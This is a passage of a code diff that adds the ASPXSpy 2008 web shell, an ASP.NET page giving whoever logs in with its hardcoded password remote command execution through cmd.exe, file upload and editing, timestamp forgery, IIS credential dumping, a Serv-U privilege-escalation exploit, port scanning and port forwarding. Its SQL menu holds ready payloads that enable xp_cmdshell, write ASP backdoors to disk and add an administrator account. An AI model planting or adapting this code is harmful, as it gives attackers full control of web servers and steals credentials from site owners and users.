+EPI=Strings.Replace(EPI,yvLU.Value,qEt.Value,1,-1,CompareMethod.Text);
+StreamWriter sw=new StreamWriter(Bin_Files.FullName,false,Encoding.Default);
+sw.Write(EPI);
+sw.Close();
+}
+}
+}
+}
+}
+catch(Exception ex)
+{
+ECIxe(ex.Message);
+continue;
+}
+}
+foreach(DirectoryInfo subdir in dir.GetDirectories())
+{
+ADR(subdir);
+}
+}
+public void ZRu(FileInfo objfile)
+{
+TableRow tr=new TableRow();
+TableCell tc=new TableCell();
+string bg=sTBx();
+tr.Attributes["onmouseover"]="this.className='focus';";
+tr.CssClass=bg;
+tr.Attributes["onmouseout"]="this.className='"+bg+"';";
+tc.Text="<a href=\"javascript:Bin_PostBack('Bin_Listdir','"+kCSO(objfile.DirectoryName)+"')\">"+objfile.FullName+"</a>";
+tr.Cells.Add(tc);
+tc=new TableCell();
+tc.Text=objfile.LastWriteTime.ToString();
+tr.Cells.Add(tc);
+tc=new TableCell();
+tc.Text=YOls(objfile.Length);
+tr.Cells.Add(tc);
+KYpMc.Rows.Add(tr);
+}
+public void ECIxe(string instr)
+{
+IAa.Visible=true;
+IAa.InnerText=instr;
+}
+// BUTTON EVENT
+protected void CPEs(object sender,EventArgs e)
+{
+string ZJdt=Fgf.Text.ToLower();
+if(Fgf.Text == "tkwocjs")
+{
+
+Response.Cookies.Add(new HttpCookie(hrdI,Password));
+men.Visible=false;
+Qvp();
+}
+else
+{
+aDWs();
+}
+
+}
+protected void TvjI(object sender,EventArgs e)
+{
+BWRS(Server.MapPath("."));
+}
+protected void lJns(object sender,EventArgs e)
+{
+Bin_H2_Title.InnerText="IIS Spy >>";
+gESS();
+CEIbZ.Visible=true;
+YKS();
+}
+protected void Pgj(object sender,EventArgs e)
+{
+try
+{
+StreamWriter sw;
+if(InfsC.SelectedItem.Text=="UTF-8")
+{
+sw=new StreamWriter(IihO.Value,false,Encoding.UTF8);
+}
+else
+{
+sw=new StreamWriter(IihO.Value,false,Encoding.Default);
+}
+sw.Write(ZPW.InnerText);
+sw.Close();
+ECIxe("Save file success !");
+}
+catch(Exception error)
+{
+ECIxe(error.Message);
+}
+BWRS(VEhV.Value);
+}
+protected void OcrQS(object sender,EventArgs e)
+{
+string yNzwg=VEhV.Value;
+yNzwg=uDFn(yNzwg);
+try
+{
+nLRI.PostedFile.SaveAs(yNzwg+Path.GetFileName(nLRI.Value));
+ECIxe("File upload success!");
+}
+catch(Exception error)
+{
+ECIxe(error.Message);
+}
+BWRS(VEhV.Value);
+}
+protected void DGLms(object sender,EventArgs e)
+{
+BWRS(VEhV.Value);
+}
+protected void LlCP(object sender,EventArgs e)
+{
+BWRS(Server.MapPath("."));
+}
+protected void athT(object sender,CommandEventArgs e)
+{
+BWRS(e.CommandArgument.ToString());
+}
+protected void jfid(object sender,EventArgs e)
+{
+try
+{
+File.SetCreationTimeUtc(DDNRa.Value,File.GetCreationTimeUtc(mvriq.Value));
+File.SetLastAccessTimeUtc(DDNRa.Value,File.GetLastAccessTimeUtc(mvriq.Value));
+File.SetLastWriteTimeUtc(DDNRa.Value,File.GetLastWriteTimeUtc(mvriq.Value));
+ECIxe("File time clone success!");
+}
+catch(Exception error)
+{
+ECIxe(error.Message);
+}
+BWRS(VEhV.Value);
+}
+protected void eVUK(object sender,EventArgs e)
+{
+string path=NuKR.Value;
+try
+{
+File.SetAttributes(path,FileAttributes.Normal);
+if(nNKXe.Checked)
+{
+File.SetAttributes(path,FileAttributes.ReadOnly);
+}
+if(zOQHD.Checked)
+{
+File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.System);
+}
+if(PdEJ.Checked)
+{
+File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.Hidden);
+}
+if(zAV.Checked)
+{
+File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.Archive);
+}
+File.SetCreationTimeUtc(path,Convert.ToDateTime(fsR.Value));
+File.SetLastAccessTimeUtc(path,Convert.ToDateTime(eEm.Value));
+File.SetLastWriteTimeUtc(path,Convert.ToDateTime(nhAM.Value));
+ECIxe("File attributes modify success!");
+}
+catch(Exception error)
+{
+ECIxe(error.Message);
+}
+BWRS(VEhV.Value);
+}
+protected void IYa(object sender,EventArgs e)
+{
+gESS();
+hIbR.Visible=true;
+Bin_H2_Title.InnerText="Execute Command >>";
+}
+protected void UtbQ(object sender,EventArgs e)
+{
+try
+{
+Process SifhH=new Process();
+SifhH.StartInfo.FileName=CwJ.Value;
+SifhH.StartInfo.Arguments=SLyNz.Value;
+SifhH.StartInfo.UseShellExecute=false;
+SifhH.StartInfo.RedirectStandardInput=true;
+SifhH.StartInfo.RedirectStandardOutput=true;
+SifhH.StartInfo.RedirectStandardError=true;
+SifhH.Start();
+string UgE=SifhH.StandardOutput.ReadToEnd();
+UgE=UgE.Replace("<","&lt;");
+UgE=UgE.Replace(">","&gt;");
+UgE=UgE.Replace("\r\n","<br>");
+WYK.Visible=true;
+WYK.InnerHtml="<hr width=\"100%\" noshade/><pre>"+UgE+"</pre>";
+}
+catch(Exception error)
+{
+ECIxe(error.Message);
+}
+}
+protected void IYDK(object sender,EventArgs e)
+{
+if(BfO.Text.Length>0)
+{
+pkYH(BfO.Text);
+}
+else
+{
+JtR();
+}
+}
+protected void kpPK(object sender,EventArgs e)
+{
+iJCYf();
+}
+protected void Kmtr(object sender,EventArgs e)
+{
+Zrn();
+}
+protected void jehH(object sender,EventArgs e)
+{
+Qpkp();
+}
+protected void mmt(object sender,EventArgs e)
+{
+gkqX();
+}
+protected void pDFc(object sender,EventArgs e)
+{
+FaAh();
+}
+protected void Fwkkc(object sender,EventArgs e)
+{
+mWEG();
+}
+protected void tkc(object sender,EventArgs e)
+{
+SgF();
+}
+protected void XCPh(object sender,EventArgs e)
+{
+WPv();
+}
+protected void nPRJ(object sender,EventArgs e)
+{
+if(((DropDownList)sender).ID.ToString()=="vin")
+{
+TIaO.Visible=false;
+lqD.Text=vin.SelectedItem.Value.ToString();
+}
+if(((DropDownList)sender).ID.ToString()=="bUat")
+{
+iRQ();
+}
+if(((DropDownList)sender).ID.ToString()=="LBu")
+{
+KFLaa.InnerText=LBu.SelectedItem.Value.ToString();
+}
+if(((DropDownList)sender).ID.ToString()=="InfsC")
+{
+DjMX(IihO.Value);
+}
+}
+protected void KKvj(object sender,EventArgs e)
+{
+BWRS(VEhV.Value);
+}
+protected void WCH(object sender,EventArgs e)
+{
+caiGE();
+}
+protected void EnB(object sender,EventArgs e)
+{
+GXO();
+}
+protected void hwN(object sender,EventArgs e)
+{
+xikE();
+}
+protected void QIS(object sender,EventArgs e)
+{
+KMn();
+ECIxe("Clear All Thread ......");
+}
+protected void hGw(object sender,EventArgs e)
+{
+if(Mcou.Value=="" || xuby.Value.Length<7 || qICb.Value=="")return;
+oTfrj();
+ECIxe("All Thread Start ......");
+}
+protected void ycN(object sender,EventArgs e)
+{
+}
+protected void XUzdy(object sender,EventArgs e)
+{
+ftDf();
+xdobO.Visible=true;
+string res=string.Empty;
+foreach(ScanPort th in kAtA)
+{
+res+=th.ip+" : "+th.port+" ................................. "+th.status+"<br>";
+}
+xdobO.InnerHtml=res;
+}
+protected void CGtpm(object sender,EventArgs e)
+{
+IgvZQ();
+}
+public void gESS()
+{
+VqmIE.Visible=false;
+EMm.Visible=false;
+uPFH.Visible=false;
+hIbR.Visible=false;
+VFlTs.Visible=false;
+kOGo.Visible=false;
+yhTL.Visible=false;
+Juh.Visible=false;
+iVn.Visible=false;
+pNH.Visible=false;
+}
+</script>
+<html xmlns="http://www.w3.org/1999/xhtml" >
+<head id="Head1" runat="server">
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
+<title>ASPXspy</title>
+<style type="text/css">
+.Bin_Style_Login{font:11px Verdana;BACKGROUND: #FFFFFF;border: 1px solid #666666;}
+body,td{font: 12px Arial,Tahoma;line-height: 16px;}
+.input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:16px;}
+.list{font:12px Arial,Tahoma;height:23px;}
+.area{font:12px 'Courier New',Monospace;background:#fff;border: 1px solid #666;padding:2px;}
+.bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}
+a {color: #00f;text-decoration:underline;}
+a:hover{color: #f00;text-decoration:none;}
+.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ededed;padding:5px 10px 5px 5px;}
+.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#fafafa;padding:5px 10px 5px 5px;}
+.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 10px 5px 5px;}
+.head td{border-top:1px solid #ddd;border-bottom:1px solid #ccc;background:#e8e8e8;padding:5px 10px 5px 5px;font-weight:bold;}
+.head td span{font-weight:normal;}
+form{margin:0;padding:0;}
+h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
+ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
+u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
+.u1{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
+.u2{text-decoration: none;color:#777;float:left;display:block;width:350px;margin-right:10px;}
+</style>
+<script type="text/javascript">
+function CheckAll(form){
+for(var i=0;i<form.elements.length;i++){
+var e=form.elements[i];
+if(e.name!='chkall')
+e.checked=form.chkall.checked;
+}
+}
+</script>
+</head>
+<body style="margin:0;table-layout:fixed;">
+<form id="ASPXSpy" runat="server">
+<div id="men" runat="server" style=" margin:15px" enableviewstate="false" visible="false" >
+<span style="font:11px Verdana;">Password:</span>
+<asp:TextBox ID="Fgf" runat="server" CssClass="Bin_Style_Login" ></asp:TextBox>
+<asp:Button ID="qNNgX" runat="server" Text="Login" CssClass="Bin_Style_Login" OnClick="CPEs"/>
+</div>
+<div id="LmtA" runat="server">
+<div id="uUD" runat="server">
+<table width="100%" border="0" cellpadding="0" cellspacing="0">
+<tr class="head">
+<td ><span style="float:right;"><a href="http://www.rootkit.net.cn" target="_blank">ASPXSpy Ver: 2008</a></span><span id="Bin_Span_Sname" runat="server" enableviewstate="true"></span></td>
+</tr>
+<tr class="alt1">
+<td><span style="float:right;" id="Bin_Span_FrameVersion" runat="server"></span>
+<asp:LinkButton ID="IOu" runat="server" OnClick="YsNJo" Text="Logout" ></asp:LinkButton> | <asp:LinkButton ID="qKiqD" runat="server" Text="File Manager" OnClick="TvjI"></asp:LinkButton> | <asp:LinkButton ID="MZrg" runat="server" Text="CmdShell" OnClick="IYa"></asp:LinkButton> | <asp:LinkButton ID="tvh" runat="server" Text="IIS Spy" OnClick="lJns"></asp:LinkButton> | <asp:LinkButton ID="vRntm" runat="server" Text="Process" OnClick="kpPK"></asp:LinkButton> | <asp:LinkButton ID="JSc" runat="server" Text="Services" OnClick="Kmtr"></asp:LinkButton> | <asp:LinkButton ID="KvQY" runat="server" Text="UserInfo" OnClick="mmt"></asp:LinkButton> | <asp:LinkButton ID="UbalD" runat="server" Text="SysInfo" OnClick="jehH"></asp:LinkButton> | <asp:LinkButton ID="rRnG" runat="server" Text="FileSearch" OnClick="nCD"></asp:LinkButton> | <asp:LinkButton ID="NEJB" runat="server" Text="SU Exp" OnClick="pDFc"></asp:LinkButton> | <asp:LinkButton ID="bcDd" runat="server" Text="RegShell" OnClick="tkc"></asp:LinkButton> | <asp:LinkButton ID="ItPd" runat="server" Text="PortScan" OnClick="EnB" ></asp:LinkButton> | <asp:LinkButton ID="rwT" runat="server" Text="DataBase" OnClick="XCPh"></asp:LinkButton> | <asp:LinkButton ID="LGb" runat="server" Text="PortMap" OnClick="hwN"></asp:LinkButton>
+</td>
+</tr>
+</table>
+</div>
+<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
+<div id="IAa" style="background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;" runat="server" visible="false" enableviewstate="false"></div>
+<h2 id="Bin_H2_Title" runat="server"></h2>
+<%--FileList--%>
+<div id="EMm" runat="server">
+<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
+ <tr>
+<td style=" white-space:nowrap">Current Directory : </td>
+<td style=" width:100%"><input class="input" id="VEhV" type="text" style="width:97%;margin:0 8px;" runat="server"/>
+</td>
+<td style="white-space:nowrap" ><asp:Button ID="kbyhH" runat="server" Text="Go" CssClass="bt" OnClick="DGLms"/></td>
+ </tr>
+</table>
+<table width="100%" border="0" cellpadding="4" cellspacing="0">
+<tr class="alt1"><td colspan="7" style="padding:5px;">
+<div style="float:right;"><input id="nLRI" class="input" runat="server" type="file" style=" height:22px"/>
+<asp:Button ID="xuL" CssClass="bt" runat="server" Text="Upload" OnClick="OcrQS"/></div><asp:LinkButton ID="lJQ" runat="server" Text="WebRoot" OnClick="LlCP"></asp:LinkButton> | <a href="#" id="Bin_Button_CreateDir" runat="server">Create Directory</a> | <a href="#" id="Bin_Button_CreateFile" runat="server">Create File</a>
+ | <span id="Bin_Span_Drv" runat="server"></span><a href="#" id="Bin_Button_KillMe" runat="server" style="color:Red">Kill Me</a>
+</td></tr>
+<asp:Table ID="bsWk" runat="server" Width="100%" CellSpacing="0" >
+<asp:TableRow CssClass="head"><asp:TableCell>&nbsp;</asp:TableCell><asp:TableCell>Filename</asp:TableCell><asp:TableCell Width="25%">Last modified</asp:TableCell><asp:TableCell Width="15%">Size</asp:TableCell><asp:TableCell Width="25%">Action</asp:TableCell></asp:TableRow>
+</asp:Table>
+</table>
+</div>
+<%--FileEdit--%>
+<div id="iVn" runat="server">
+<p>Current File(import new file name and new file)<br/>
+<input class="input" id="IihO" type="text" size="100" runat="server"/> <asp:DropDownList ID="InfsC" runat="server" CssClass="list" AutoPostBack="true" OnSelectedIndexChanged="nPRJ"><asp:ListItem>Default</asp:ListItem><asp:ListItem>UTF-8</asp:ListItem></asp:DropDownList>
+</p>
+<p>File Content<br/>
+<textarea id="ZPW" runat="server" class="area" cols="100" rows="25" enableviewstate="true" ></textarea>
+</p>
+<p><asp:Button ID="VqhZF" runat="server" Text="Submit" CssClass="bt" OnClick="Pgj"/> <asp:Button ID="SVCND" runat="server" Text="Back" CssClass="bt" OnClick="KKvj"/></p>
+</div>
+<%--CloneTime--%>
+<div id="oMPI" runat="server" enableviewstate="false" visible="false">
+<p>Alter file<br/><input class="input" id="DDNRa" type="text" size="120" runat="server"/></p>
+<p>Reference file(fullpath)<br/><input class="input" id="mvriq" type="text" size="120" runat="server"/></p>
+<p><asp:Button ID="TBRr" runat="server" Text="Submit" CssClass="bt" OnClick="jfid"/></p>
+<h2>Set last modified &raquo;</h2>
+<p>Current file(fullpath)<br/><input class="input" id="NuKR" type="text" size="120" runat="server"/></p>
+<p>
+<asp:CheckBox ID="nNKXe" runat="server" Text="ReadOnly" EnableViewState="False"/>
+&nbsp;
+<asp:CheckBox ID="zOQHD" runat="server" Text="System" EnableViewState="False"/>
+&nbsp;
+<asp:CheckBox ID="PdEJ" runat="server" Text="Hidden" EnableViewState="False"/>
+&nbsp;
+<asp:CheckBox ID="zAV" runat="server" Text="Archive" EnableViewState="False"/>
+</p>
+<p>
+CreationTime :
+<input class="input" id="fsR" type="text" runat="server"/>
+LastWriteTime :
+<input class="input" id="nhAM" type="text" runat="server"/>
+LastAccessTime :
+<input class="input" id="eEm" type="text" runat="server"/>
+</p>
+<p>
+<asp:Button ID="NRG" CssClass="bt" runat="server" Text="Submit" OnClick="eVUK"/>
+</p>
+</div>
+<%--IISSpy--%>
+<div runat="server" id="CEIbZ" visible="false" enableviewstate="false">
+<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
+<asp:Table ID="sXHZB" runat="server" Width="100%" CellSpacing="0">
+<asp:TableRow CssClass="head"><asp:TableCell><asp:Button runat="server" id="gYf" CssClass="bt" onclick="yfIo" Text="Export"/></asp:TableCell><asp:TableCell>IIS_USER</asp:TableCell><asp:TableCell>IIS_PASS</asp:TableCell><asp:TableCell>Domain</asp:TableCell><asp:TableCell>Path</asp:TableCell></asp:TableRow>
+</asp:Table>
+</table>
+</div>
+<%--Process--%>
+<div runat="server" id="VqmIE" visible="false" enableviewstate="false">
+<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
+<asp:Table ID="CuE" runat="server" Width="100%" CellSpacing="0" >
+<asp:TableRow CssClass="head"><asp:TableCell></asp:TableCell><asp:TableCell>ID</asp:TableCell><asp:TableCell>Process</asp:TableCell><asp:TableCell>ThreadCount</asp:TableCell><asp:TableCell>Priority</asp:TableCell><asp:TableCell>Action</asp:TableCell></asp:TableRow>
+</asp:Table>
+</table>
+</div>
+<%--CmdShell--%>
+<div runat="server" id="hIbR">
+ <p>CmdPath:<br/>
+ <input class="input" runat="server" id="CwJ" type="text" size="100" value="c:\windows\system32\cmd.exe"/>
+ </p>
+ Argument:<br/>
+ <input class="input" runat="server" id="SLyNz" value="/c Set" type="text" size="100"/> <asp:Button ID="GumL" CssClass="bt" runat="server" Text="Submit" OnClick="UtbQ"/>
+ <div id="WYK" runat="server" visible="false" enableviewstate="false">
+ </div>
+</div>
+<%--Services--%>
+<div runat="server" id="naEZ" visible ="false" enableviewstate="false">
+<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
+<asp:Table ID="lgBS" runat="server" Width="100%" CellSpacing="0" >
+<asp:TableRow CssClass="head"><asp:TableCell></asp:TableCell><asp:TableCell>ID</asp:TableCell><asp:TableCell>Name</asp:TableCell><asp:TableCell>Path</asp:TableCell><asp:TableCell>State</asp:TableCell><asp:TableCell>StartMode</asp:TableCell></asp:TableRow>
+</asp:Table>
+</table>
+</div>
+<%--Sysinfo--%>
+<div runat="server" id="iWHDm" visible="false" enableviewstate="false">
+<hr style=" border: 1px solid #ddd;height:0px;"/>
+<ul class="info" id="Bin_Ul_Sys" runat="server"></ul>
+<h2 id="Bin_H2_Mac" runat="server"></h2>
+<hr style=" border: 1px solid #ddd;height:0px;"/>
+<ul class="info" id ="Bin_Ul_NetConfig" runat="server"></ul>
+<h2 id="Bin_H2_Driver" runat="server"></h2>
+<hr style=" border: 1px solid #ddd;height:0px;"/>
+<ul class="info" id ="Bin_Ul_Driver" runat="server"></ul>
+</div>
+<%--UserInfo--%>
+<div runat="server" id="WCc" visible="false" enableviewstate="false">
+<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
+<asp:Table ID="apu" runat="server" Width="100%" CellSpacing="0" >
+</asp:Table>
+</table>
+</div>
+<%--SuExp--%>
+ <div runat="server" id="uPFH">
+<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
+ <tr align="center">
+ <td style="width:10%"></td>
+ <td style="width:20%" align="left">UserName : <input class="input" runat="server" id="CDRf" type="text" size="20" value="localadministrator"/></td>
+ <td style="width:20%" align="left">PassWord : <input class="input" runat="server" id="dFUE" type="text" size="20" value="#l@$ak#.lk;0@P"/></td>
+ <td style="width:20%" align="left">Port : <input class="input" runat="server" id="MlEe" type="text" size="20" value="43958"/></td>
+ <td style="width:10%"></td>
+ </tr>
+ <tr >
+ <td style="width:10%"></td>
+ <td colspan="5">CmdShell&nbsp;&nbsp;:&nbsp;<input class="input" runat="server" id="AzsA" type="text" size="100" value="cmd.exe /c net user"/> <asp:Button ID="NEHJ" CssClass="bt" runat="server" Text="Exploit" OnClick="Fwkkc"/></td>
+ </tr>
+</table>
+<div id="jAFeu" visible="false" enableviewstate="false" runat="server">
+<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
+<tr align="center">
+<td style="width:30%"></td>
+<td align="left" style="width:40%"><pre id="Bin_Td_Res" runat="server"></pre></td>
+<td style="width:30%"></td>
+</tr>
+</table>
+</div>
+</div>
+<%--Reg--%>
+<div id="VFlTs" runat="server">
+<p>Registry Path : <asp:TextBox id="BfO" style="width:85%;margin:0 8px;" CssClass="input" runat="server"/><asp:Button ID="Unz" runat="server" Text="Go" CssClass="bt" onclick="IYDK"/></p>
+<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
+<asp:Table ID="RueK" runat="server" Width="100%" CellSpacing="0" >
+<asp:TableRow CssClass="alt1"><asp:TableCell ColumnSpan="2" id="tYH"></asp:TableCell></asp:TableRow>
+<asp:TableRow CssClass="head"><asp:TableCell Width="40%">Key</asp:TableCell><asp:TableCell Width="60%">Value</asp:TableCell></asp:TableRow>
+</asp:Table>
+</table>
+</div>
+<%--PortScan--%>
+<div id="kOGo" runat="server">
+<p>
+IP : <asp:TextBox id="rQz" style="width:10%;margin:0 8px;" CssClass="input" runat="server" Text="127.0.0.1"/> Port : <asp:TextBox id="ZUUG" style="width:40%;margin:0 8px;" CssClass="input" runat="server" Text="21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500"/> <asp:Button ID="xmMfV" runat="server" Text="Scan" CssClass="bt" OnClick="XUzdy"/>
+</p>
+<div id="xdobO" runat="server" visible="false" enableviewstate="false"></div>
+</div>
+<%--DataBase--%>
+<div id="yhTL" runat="server">
+<p>ConnString : <asp:TextBox id="lqD" style="width:70%;margin:0 8px;" CssClass="input" runat="server"/><asp:DropDownList runat="server" CssClass="list" ID="vin" AutoPostBack="True" OnSelectedIndexChanged="nPRJ" ><asp:ListItem></asp:ListItem><asp:ListItem Value="server=localhost;UID=sa;PWD=;database=master;Provider=SQLOLEDB">MSSQL</asp:ListItem><asp:ListItem Value="Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\database.mdb">ACCESS</asp:ListItem></asp:DropDownList><asp:Button ID="VJpG" runat="server" Text="Go" CssClass="bt" OnClick="WCH"/></p>
+<div id="TIaO" runat="server">
+<div id="QKsC" runat="server"></div>
+<div id="zUY" runat="server">
+Please select a database : <asp:DropDownList runat="server" ID="bUat" AutoPostBack="True" OnSelectedIndexChanged="nPRJ" CssClass="list"></asp:DropDownList>
+SQLExec : <asp:DropDownList runat="server" ID="LBu" AutoPostBack="True" OnSelectedIndexChanged="nPRJ" CssClass="list"><asp:ListItem Value="">-- SQL Server Exec --</asp:ListItem><asp:ListItem Value="Use master dbcc addextendedproc('xp_cmdshell','xplog70.dll')">Add xp_cmdshell</asp:ListItem><asp:ListItem Value="Use master dbcc addextendedproc('sp_OACreate','odsole70.dll')">Add sp_oacreate</asp:ListItem><asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;">Add xp_cmdshell(SQL2005)</asp:ListItem><asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;">Add sp_oacreate(SQL2005)</asp:ListItem><asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Web Assistant Procedures',1;RECONFIGURE;">Add makewebtask(SQL2005)</asp:ListItem><asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;">Add openrowset/opendatasource(SQL2005)</asp:ListItem><asp:ListItem Value="Exec master.dbo.xp_cmdshell 'net user'">XP_cmdshell exec</asp:ListItem><asp:ListItem Value="EXEC MASTER..XP_dirtree 'c:\',1,1">XP_dirtree</asp:ListItem><asp:ListItem Value="Declare @s int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^>>c:\bin.asp';">SP_oamethod exec</asp:ListItem><asp:ListItem Value="sp_makewebtask @outputfile='c:\bin.asp',@charset=gb2312,@query='select ''&lt;%execute(request(chr(35)))%&gt;'''">SP_makewebtask make file</asp:ListItem><asp:ListItem Value="exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1;select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell(&#34;cmd.exe /c net user root root/add &#34;)')">SandBox</asp:ListItem><asp:ListItem Value="create table [bin_cmd]([cmd] [image]);declare @a sysname,@s nvarchar(4000)select @a=db_name(),@s=0x62696E backup log @a to disk=@s;insert into [bin_cmd](cmd)values('&lt;%execute(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t='e:\1.asp' backup log @b to disk=@t with init,no_truncate;drop table [bin_cmd];">LogBackup</asp:ListItem><asp:ListItem Value="create table [bin_cmd]([cmd] [image]);declare @a sysname,@s nvarchar(4000)select @a=db_name(),@s=0x62696E backup database @a to disk=@s;insert into [bin_cmd](cmd)values('&lt;%execute(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t='c:\bin.asp' backup database @b to disk=@t WITH DIFFERENTIAL,FORMAT;drop table [bin_cmd];">DatabaseBackup</asp:ListItem></asp:DropDownList>
+</div>
+<table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td> Run SQL </td></tr><tr><td><textarea id="KFLaa" class="area" style="width:600px;height:60px;overflow:auto;" runat="server" rows="6" cols="1"></textarea></td></tr><tr><td>
+<asp:Button runat="server" ID="RKEy" CssClass="bt" Text="Query" onclick="CGtpm"/></td></tr></table>
+<div style="overflow-x:auto;width:950px" >
+<p>
+<asp:DataGrid runat="server" ID="rVfN" HeaderStyle-CssClass="head" BorderWidth="0" GridLines="None" ></asp:DataGrid>
+</p>
+</div>
+</div>
+</div>
+<%--PortMap--%>
+<div id="Juh" runat="server">
+<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
+<tr align="center">
+<td style="width:5%"></td>
+<td style="width:20%" align="left">Local Ip : <input class="input" runat="server" id="xuby" type="text" size="20" value="127.0.0.1"/></td>
+<td style="width:20%" align="left">Local Port : <input class="input" runat="server" id="Mcou" type="text" size="20" value="3389"/></td>
+<td style="width:20%" align="left">Remote Ip : <input class="input" runat="server" id="IPRwP" type="text" size="20" value="www.rootkit.net.cn"/></td>
+<td style="width:20%" align="left">Remote Port : <input class="input" runat="server" id="qICb" type="text" size="20" value="80"/></td></tr>
+<tr align="center"><td colspan="5"><br/><asp:Button ID="PiJK" CssClass="bt" runat="server" Text="MapPort" OnClick="hGw"/> <asp:Button ID="cAUZ" CssClass="bt" runat="server" Text="ClearAll" OnClick="QIS"/> <asp:Button ID="wvIGT" CssClass="bt" runat="server" Text="Refresh" OnClick="ycN"/></td></tr></table></div>
+<%--Search--%>
+<div id="pNH" runat="server">
+<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
+<tr align="center">
+<td style="width:20%" align="left">Keyword</td>
+<td style="width:60%" align="left"><textarea id="yvLU" runat="server" class="area" style="width:100%" rows="4"></textarea></td>
+<td style="width:20%" align="left"><input type="checkbox" runat="server" id="FVfS" value="1"/> Use Regex</td>
+</tr>
+<tr align="center">
+<td style="width:20%" align="left">Replace As</td>
+<td style="width:60%" align="left"><textarea id="qEt" runat="server" class="area" style="width:100%" rows="4"></textarea></td>
+<td style="width:20%" align="left"><input type="checkbox" runat="server" id="NlwU"/> Replace</td>
+</tr>
+<tr align="center">
+<td style="width:20%" align="left">Search FileType</td>
+<td style="width:60%" align="left"><input type="text" runat="server" class="input" id="yUn" style="width:100%" value="asp|asa|cer|cdx|aspx|asax|ascx|cs|jsp|php|txt|inc|ini|js|htm|html|xml|config"/></td>
+<td style="width:20%" align="left"><asp:DropDownList runat="server" ID="HUxGY" AutoPostBack="False" CssClass="list"><asp:ListItem Value="name">File Name</asp:ListItem><asp:ListItem Value="content" Selected="True">File Content</asp:ListItem></asp:DropDownList></td>
+</tr>
+<tr align="center">
+<td style="width:20%" align="left">Path</td>
+<td style="width:60%" align="left"><input type="text" class="input" id="jxF" runat="server" style="width:100%" /></td>
+<td style="width:20%" align="left"><asp:Button CssClass="bt" id="ISs" runat="server" onclick="hTX" Text="Start" /></td>
+</tr>
+</table>
+<br/>
+<br/>
+<asp:Table ID="KYpMc" runat="server" Width="100%" CellSpacing="0" >
+<asp:TableRow CssClass="head"><asp:TableCell Width="60%">File Path</asp:TableCell><asp:TableCell Width="20%">Last modified</asp:TableCell><asp:TableCell Width="20%">Size</asp:TableCell></asp:TableRow>
+</asp:Table>
+</div>
+</td></tr></table>
+<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">Copyright(C)2006-2008 <a href="http://www.rootkit.net.cn" target="_blank">Bin'Blog</a> All Rights Reserved.</div></div>
+</form>
+</body>
+</html>
